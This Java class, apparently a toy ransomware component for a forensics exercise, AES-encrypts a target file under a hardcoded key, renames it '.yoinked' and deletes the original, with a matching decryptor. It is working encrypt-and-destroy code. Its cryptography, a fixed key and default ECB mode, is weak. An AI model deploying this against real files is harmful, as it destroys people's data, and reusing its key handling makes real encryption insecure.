package forensic.ransom;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class RansomFactory
{
	private static final String RANSOM_KEY = "1234567890123456";
	
	public static void encryptFile(File file)
	{
		try {
			if (file.exists())
			{
				File outputFile = RansomFactory.createNewFile(file.getName() + ".yoinked");
				byte[] fileBytes = Files.readAllBytes(file.toPath());
				byte[] encryptedBytes = RansomFactory.encrypt(fileBytes, RANSOM_KEY.getBytes());
				Files.write(outputFile.toPath(), encryptedBytes);
				file.delete();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public static void decryptFile(File file)
	{
		try {
			if (file.exists())
			{
				String name = file.getName();
				int lastDotIndex = name.lastIndexOf('.');
				if (lastDotIndex != -1) {
				    name = name.substring(0, lastDotIndex);
				}
				
				File outputFile = RansomFactory.createNewFile(name);
				if (outputFile != null)
				{
					byte[] encryptedBytes = Files.readAllBytes(file.toPath());
			        byte[] decryptedBytes = RansomFactory.decrypt(encryptedBytes, RANSOM_KEY.getBytes());
			        Files.write(outputFile.toPath(), decryptedBytes);
			        file.delete();
				}
			}
		} catch(Exception e) {
			e.printStackTrace();
		}
	}
	
	public static void decryptFile(String path)
	{
		RansomFactory.decryptFile(new File(path));
	}
	
	public static void encryptFile(String fileName)
	{
		RansomFactory.encryptFile(new File(fileName));
	}
	
	private static File createNewFile(String path)
	{
		File newFile = new File(path);
		try {
			newFile.createNewFile();
			return newFile;
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		return null;
	}
	
	private static byte[] encrypt(byte[] data, byte[] key) throws Exception
	{
        Cipher cipher = Cipher.getInstance("AES");
        SecretKeySpec secretKeySpec = new SecretKeySpec(key, "AES");
        cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec);
        return cipher.doFinal(data);
    }

    private static byte[] decrypt(byte[] data, byte[] key) throws Exception
    {
        Cipher cipher = Cipher.getInstance("AES");
        SecretKeySpec secretKeySpec = new SecretKeySpec(key, "AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKeySpec);
        return cipher.doFinal(data);
    }
}